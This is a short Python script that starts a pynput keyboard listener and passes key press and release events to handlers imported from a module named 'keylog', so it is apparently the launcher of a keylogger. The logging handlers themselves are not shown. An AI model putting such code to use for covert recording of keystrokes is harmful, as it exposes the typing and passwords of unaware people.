from pynput.keyboard import Listener

from keylog import key_press, key_release

def main():
	with Listener(on_press = key_press, on_release = key_release) as listener:
		listener.join()

if __name__ == "__main__":
	main()
